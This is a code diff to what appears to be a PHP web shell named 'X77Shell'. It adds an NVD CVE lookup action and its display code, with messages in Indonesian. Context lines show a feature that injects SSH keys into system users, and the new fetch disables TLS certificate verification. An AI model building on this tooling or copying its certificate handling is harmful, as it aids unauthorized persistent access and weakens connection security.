@@ -666,6 +666,75 @@ if ($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['action'])) {
         echo json_encode(['ok'=>true, 'msg'=>"SSH key injected into $injected user(s)"]); exit;
     }
 
+    // ======================= CVE Lookup via NVD API ===========================
+    if ($action === 'cve_lookup') {
+        $cve_id = trim($_POST['cve_id'] ?? '');
+        if (empty($cve_id)) {
+            echo json_encode(['ok' => false, 'out' => 'CVE ID tidak boleh kosong']);
+            exit;
+        }
+        if (!preg_match('/^CVE-\d{4}-\d+$/i', $cve_id)) {
+            echo json_encode(['ok' => false, 'out' => 'Format CVE tidak valid (contoh: CVE-2024-1234)']);
+            exit;
+        }
+        $url = 'https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=' . urlencode($cve_id);
+        $opts = [
+            'http' => [
+                'method' => 'GET',
+                'header' => 'User-Agent: X77Shell/1.0',
+                'timeout' => 10
+            ],
+            'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]
+        ];
+        $context = stream_context_create($opts);
+        $response = @file_get_contents($url, false, $context);
+        if ($response === false) {
+            echo json_encode(['ok' => false, 'out' => 'Gagal mengambil data dari NVD API']);
+            exit;
+        }
+        $data = json_decode($response, true);
+        if (!isset($data['vulnerabilities'][0])) {
+            echo json_encode(['ok' => false, 'out' => 'CVE tidak ditemukan']);
+            exit;
+        }
+        $vuln = $data['vulnerabilities'][0]['cve'];
+        $id = $vuln['id'];
+        $desc = $vuln['descriptions'][0]['value'] ?? 'Deskripsi tidak tersedia';
+        $severity = $vuln['metrics']['cvssMetricV31'][0]['cvssData']['baseSeverity'] ?? 'N/A';
+        $score = $vuln['metrics']['cvssMetricV31'][0]['cvssData']['baseScore'] ?? 'N/A';
+        $published = $vuln['published'] ?? 'N/A';
+        $lastModified = $vuln['lastModified'] ?? 'N/A';
+        $references = [];
+        if (isset($vuln['references'])) {
+            foreach ($vuln['references'] as $ref) {
+                $references[] = $ref['url'];
+            }
+        }
+        $cwe = $vuln['weaknesses'][0]['description'][0]['value'] ?? 'N/A';
+        // Format output
+        $out = "ID: $id\n";
+        $out .= "Severity: $severity (Score: $score)\n";
+        $out .= "Published: $published\n";
+        $out .= "Last Modified: $lastModified\n";
+        $out .= "CWE: $cwe\n\n";
+        $out .= "Description:\n$desc\n\n";
+        if ($references) {
+            $out .= "References:\n" . implode("\n", array_slice($references, 0, 5));
+        }
+        echo json_encode([
+            'ok' => true,
+            'out' => $out,
+            'severity' => $severity,
+            'score' => $score,
+            'id' => $id,
+            'published' => $published,
+            'lastModified' => $lastModified,
+            'cwe' => $cwe,
+            'references' => $references
+        ]);
+        exit;
+    }
+
     if ($action==='get_history'){echo json_encode(['history'=>$his]);exit;}
     if ($action==='get_log'){echo json_encode(['log'=>$_SESSION['activity_log']??[]]);exit;}
     if ($action==='change_pass'){global $USERS;$u=$_SESSION['user'];$old=$_POST['old']??'';$new=$_POST['new']??'';if(!password_verify($old,$USERS[$u]??'')){echo json_encode(['ok'=>false,'msg'=>'Password lama salah']);exit;}if(strlen($new)<6){echo json_encode(['ok'=>false,'msg'=>'Min 6 karakter']);exit;}$log('CHANGE_PASS');echo json_encode(['ok'=>true,'msg'=>'Diganti (sesi ini)']);exit;}
@@ -2101,7 +2170,45 @@ if (empty($_SESSION['auth'])) {
         async function doSecCL(){document.getElementById('sc-r').textContent='Running...';const r=await post({action:'sec_checklist'});const pct=r.total?Math.round(r.score/r.total*100):0;document.getElementById('sc-r').innerHTML=`${scoreBar(r.score,r.total)}<pre style="white-space:pre-wrap;font-family:inherit;font-size:inherit">${renderSec(r.out||'Error')}</pre>`;toast(`Checklist: ${pct}%`,pct>=80?'ok':'err');}
         function cveTab(tab,btn){['lookup','search','recent'].forEach(t=>{document.getElementById('cvep-'+t).style.display=t===tab?'flex':'none';document.getElementById('cve-tab-'+t)?.classList.toggle('on',t===tab);});}
         function cveSevHTML(txt){return esc(txt).replace(/\(CRITICAL\)/g,'<span style="color:var(--d);font-weight:700">(CRITICAL)</span>').replace(/\(HIGH\)/g,'<span style="color:#f97316;font-weight:700">(HIGH)</span>').replace(/\(MEDIUM\)/g,'<span style="color:var(--w)">(MEDIUM)</span>').replace(/\(LOW\)/g,'<span style="color:var(--a3)">(LOW)</span>').replace(/(CVE-\d{4}-\d+)/g,'<span style="color:var(--a);font-weight:700;cursor:pointer" onclick="document.getElementById(\'cve-id\').value=\'$1\';cveTab(\'lookup\',null);doCVEL()">$1</span>');}
-        async function doCVEL(){const id=document.getElementById('cve-id').value.trim().toUpperCase();if(!id){toast('Enter CVE ID','err');return;}const res=document.getElementById('cve-l-r');res.innerHTML='<span style="color:var(--dim)">⟳ Fetching NVD...</span>';try{const r=await post({action:'cve_lookup',cve_id:id});if(!r.ok){res.textContent=r.out||'Error';res.style.color='var(--d)';return;}res.style.color='';const c=sevColor(r.severity||'');res.innerHTML=`<div style="border-left:3px solid ${c};padding-left:8px"><pre style="white-space:pre-wrap;font-family:inherit">${esc(r.out)}</pre></div>`;toast(`CVE loaded: ${id}`,'ok');}catch(e){res.textContent='Error: '+e.message;res.style.color='var(--d)';}}
+        async function doCVEL() {
+            const id = document.getElementById('cve-id').value.trim().toUpperCase();
+            if (!id) {
+                toast('Masukkan CVE ID', 'err');
+                return;
+            }
+            if (!/^CVE-\d{4}-\d+$/.test(id)) {
+                toast('Format CVE tidak valid (contoh: CVE-2024-1234)', 'err');
+                return;
+            }
+            const res = document.getElementById('cve-l-r');
+            res.innerHTML = '<span style="color:var(--dim)">⏳ Mengambil data dari NVD...</span>';
+            res.style.color = '';
+            try {
+                const r = await post({ action: 'cve_lookup', cve_id: id });
+                if (!r.ok) {
+                    res.textContent = r.out || 'Error';
+                    res.style.color = 'var(--d)';
+                    return;
+                }
+                // Tampilkan hasil
+                const severityColor = r.severity === 'CRITICAL' ? 'var(--d)' :
+                r.severity === 'HIGH' ? '#f97316' :
+                r.severity === 'MEDIUM' ? 'var(--w)' : 'var(--a3)';
+                let html = `<div style="border-left:4px solid ${severityColor}; padding-left:10px; margin-bottom:6px;">`;
+                html += `<div style="font-size:12px; font-weight:700; color:var(--a);">${esc(r.id)}</div>`;
+                html += `<div style="font-size:10px; color:${severityColor}; font-weight:600;">Severity: ${esc(r.severity)} (Score: ${esc(r.score)})</div>`;
+                html += `<div style="font-size:9px; color:var(--dim);">Published: ${esc(r.published)} | Modified: ${esc(r.lastModified)}</div>`;
+                html += `</div>`;
+                html += `<div style="font-size:10px; white-space:pre-wrap; word-break:break-word;">${esc(r.out)}</div>`;
+                // Link ke NVD
+                html += `<div style="margin-top:8px; font-size:9px;"><a href="https://nvd.nist.gov/vuln/detail/${esc(r.id)}" target="_blank" style="color:var(--a2);">🔗 Buka di NVD (detail lengkap)</a></div>`;
+                res.innerHTML = html;
+                toast('Data CVE ditemukan', 'ok');
+            } catch (e) {
+                res.textContent = 'Error: ' + e.message;
+                res.style.color = 'var(--d)';
+            }
+        }
         async function doCVES(){const kw=document.getElementById('cve-kw').value.trim();if(!kw){toast('Enter keyword','err');return;}const yr=document.getElementById('cve-yr').value;const sv=document.getElementById('cve-sv').value;const res=document.getElementById('cve-s-r');res.innerHTML=`<span style="color:var(--dim)">⟳ Searching "${kw}"...</span>`;try{const r=await post({action:'cve_search',keyword:kw,year:yr,severity:sv});if(!r.ok){res.textContent=r.out||'Error';res.style.color='var(--d)';return;}res.style.color='';res.innerHTML=`<pre style="white-space:pre-wrap;font-family:inherit">${cveSevHTML(r.out)}</pre>`;toast('Search done','ok');}catch(e){res.textContent='Error: '+e.message;res.style.color='var(--d)';}}
         async function doCVER(){const res=document.getElementById('cve-r-r');res.innerHTML='<span style="color:var(--dim)">⟳ Loading latest CVEs...</span>';try{const r=await post({action:'cve_recent'});if(!r.ok){res.textContent=r.out||'Error';res.style.color='var(--d)';return;}res.style.color='';res.innerHTML=`<pre style="white-space:pre-wrap;font-family:inherit">${cveSevHTML(r.out)}</pre>`;toast('Latest CVEs loaded!','ok');}catch(e){res.textContent='Error: '+e.message;res.style.color='var(--d)';}}
         async function loadLog(){const r=await post({action:'get_log'});const log=r.log||[];document.getElementById('alog').innerHTML=log.length?[...log].reverse().map(l=>`<div class="alog-r"><span class="alog-t">${esc(l.time)}</span><span class="alog-u">${esc(l.user)}</span><span class="alog-a">${esc(l.action)}</span><span class="alog-ip">${esc(l.ip||'')}</span></div>`).join(''):'<div style="color:var(--dim)">Log empty.</div>';}
